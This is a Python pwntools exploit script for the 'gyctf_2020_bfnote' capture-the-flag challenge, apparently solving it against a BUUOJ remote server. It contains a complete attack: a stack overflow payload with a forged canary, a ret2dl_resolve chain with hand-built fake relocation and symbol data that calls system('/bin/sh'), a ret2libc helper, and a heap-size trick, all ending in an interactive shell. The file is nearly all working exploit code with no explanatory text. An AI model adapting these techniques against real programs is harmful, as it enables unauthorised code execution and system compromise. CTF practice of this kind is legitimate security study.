from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './gyctf_2020_bfnote'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn',27691) if argv[1]=='r' else process(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc = ELF('./glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')

def dbg():
	gdb.attach(p)
	pause()

_add,_free,_edit,_show = 1,3,2,4
def add(size,content='a'):
	sla('puts\n',str(_add))
	sla('size\n',str(size))
	ru('0x')
	addr = int(ru('\n'),16)
	sa('content',content)
	return addr

def free(index):
	sla('?',str(_free))
	sla('?',str(index))

def edit(index,content):
	sla('?',str(_edit))
	sla('?',str(index))
	s(content)

def show(index):
	sla(':',str(_show))
	sla(':',str(index))

# start
dl_resolve_data='\x80\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00\x37\x66\x66\x5a\x6d\x59\x50\x47\x60\xa1\x04\x08\x07\x25\x02\x00\x73\x79\x73\x74\x65\x6d\x00'
dl_resolve_call='\x50\x84\x04\x08\x70\x20\x00\x00'

canary=0xdeadbe00
postscript=0x804a060

payload = flat('a'*0x32,canary,0,postscript+4+0x3a8)
sa('description :',payload)

payload = flat('a'*0x3a8,dl_resolve_call,0x12345678,postscript+0x3b8,'/bin/sh\x00',0,0,dl_resolve_data)
sa("postscript : ",payload)

sla('notebook size :',0x200000)
sla('title size :',0x20170c-0x10)
sla('re-enter :',100)
sla('title :','a')
sa('note :',p32(canary))

p.interactive()
# end

itr()
